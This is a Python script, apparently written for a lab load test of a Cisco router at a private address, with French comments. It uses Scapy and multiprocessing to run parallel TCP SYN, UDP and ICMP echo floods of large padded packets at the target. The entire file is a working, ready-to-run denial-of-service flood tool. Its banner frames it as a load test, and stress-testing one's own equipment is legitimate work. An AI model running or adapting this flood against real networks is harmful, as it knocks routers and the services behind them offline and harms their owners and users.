from scapy.all import *
import multiprocessing
import time

from scapy.layers.inet import IP, UDP, TCP, ICMP

# --------------------
# PARAMÈTRES GÉNÉRAUX
# --------------------
TARGET_IP = "192.168.99.228"  # Adresse IP du routeur Cisco
PORT = 12345  # Port cible arbitraire (le routeur ne l’écoute pas, on vise l’interface)
PACKETS_PER_PROCESS = 20000  # Nombre de paquets envoyés par processus
NUM_PROCESSES = 5  # Nombre de processus pour générer du trafic en parallèle
PACKET_SIZE = 1400  # Taille du paquet en octets (peut être ajustée pour tester des paquets plus gros)

# --------------------
# FONCTIONS D'ENVOI
# --------------------

def send_tcp_flood():
    payload = "A" * PACKET_SIZE  # Crée un payload de taille spécifiée
    packet = IP(dst=TARGET_IP) / TCP(dport=PORT, flags="S") / Raw(load=payload)
    send(packet, count=PACKETS_PER_PROCESS, inter=0.0001, verbose=False)


def send_udp_flood():
    payload = "A" * PACKET_SIZE  # Crée un payload de taille spécifiée
    packet = IP(dst=TARGET_IP) / UDP(dport=PORT) / Raw(load=payload)
    send(packet, count=PACKETS_PER_PROCESS, inter=0.0001, verbose=False)


def send_icmp_flood():
    payload = "A" * PACKET_SIZE  # Crée un payload de taille spécifiée
    packet = IP(dst=TARGET_IP) / ICMP(type=8) / Raw(load=payload)  # Echo request
    send(packet, count=PACKETS_PER_PROCESS, inter=0.0001, verbose=False)

# --------------------
# LANCEMENT MULTIPROCESS
# --------------------

def launch_attack():
    processes = []

    for _ in range(NUM_PROCESSES):
        processes.append(multiprocessing.Process(target=send_tcp_flood))
        processes.append(multiprocessing.Process(target=send_udp_flood))
        processes.append(multiprocessing.Process(target=send_icmp_flood))

    print(f"🚀 Lancement de l'attaque parallèle avec {len(processes)} processus...")

    for process in processes:
        process.start()

    for process in processes:
        process.join()

    print("✅ Tous les processus terminés.")

# --------------------
# MAIN
# --------------------

if __name__ == "__main__":
    print("=== TEST DE CHARGE ROUTEUR CISCO ===")
    print(f"Cible : {TARGET_IP} | Port : {PORT} | {NUM_PROCESSES} processus | {PACKETS_PER_PROCESS} paquets/process | Taille des paquets : {PACKET_SIZE} octets")
    start_time = time.time()
    launch_attack()
    print(f"⏱️ Durée totale : {time.time() - start_time:.2f} secondes")
